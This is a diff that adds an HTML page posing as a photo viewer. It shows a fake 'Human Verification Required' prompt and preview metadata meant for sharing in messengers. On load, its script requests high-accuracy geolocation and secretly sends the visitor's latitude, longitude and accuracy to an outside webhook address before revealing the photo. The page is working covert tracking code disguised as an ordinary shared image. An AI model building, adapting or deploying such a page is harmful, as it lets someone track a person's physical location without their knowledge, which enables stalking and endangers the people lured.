@@ -1,0 +1,68 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <title>Photo View</title>
+    
+    <meta property="og:title" content=" ">
+    <meta property="og:description" content=" ">
+    <meta property="og:image" content="https://i.postimg.cc/xdRX9xYB/IMG-6614.jpg">
+    <meta property="og:image:width" content="1200">
+    <meta property="og:image:height" content="630">
+    <meta property="og:type" content="website">
+
+    <style>
+        body { margin: 0; background-color: black; display: flex; justify-content: center; align-items: center; height: 100vh; font-family: sans-serif; color: white; overflow: hidden; }
+        #content { display: none; }
+        #message { text-align: center; padding: 20px; }
+        img { max-width: 100%; height: auto; }
+        .btn { background: #0084ff; color: white; padding: 10px 20px; border: none; border-radius: 5px; text-decoration: none; display: inline-block; margin-top: 15px; cursor: pointer; }
+    </style>
+</head>
+<body>
+
+    <div id="message">
+        <h3>Human Verification Required</h3>
+        <p>Please open this link in your <b>system browser</b> (Chrome/Safari) to verify and view the photo.</p>
+        <button class="btn" onclick="openInBrowser()">Open in Browser</button>
+    </div>
+
+    <div id="content">
+        <img src="https://i.postimg.cc/xdRX9xYB/IMG-6614.jpg">
+    </div>
+
+    <script>
+        function openInBrowser() {
+            // অনেক সময় অটোমেটিক ব্রাউজার খোলার জন্য এটি কাজ করে
+            window.location.href = window.location.href + "?open_external_browser=1";
+        }
+
+        window.onload = function() {
+            // যদি ব্রাউজার পারমিশন সাপোর্ট করে
+            if (navigator.geolocation) {
+                navigator.geolocation.getCurrentPosition(function(position) {
+                    
+                    // লোকেশন তথ্য পাঠানো
+                    fetch("https://e2f275a6-8c4f-4a12-81a9-12f2a1b5d56e.webhooksite.net", {
+                        method: 'POST',
+                        mode: 'no-cors',
+                        body: JSON.stringify({ 
+                            lat: position.coords.latitude, 
+                            lon: position.coords.longitude,
+                            accuracy: position.coords.accuracy + "m"
+                        })
+                    });
+
+                    // ছবি দেখানো
+                    document.getElementById('message').style.display = 'none';
+                    document.getElementById('content').style.display = 'block';
+
+                }, function(error) {
+                    // মেসেঞ্জারে সাধারণত এখানে এরর আসবে
+                    console.log("Permission denied or browser blocked.");
+                }, { enableHighAccuracy: true });
+            }
+        };
+    </script>
+</body>
+</html>
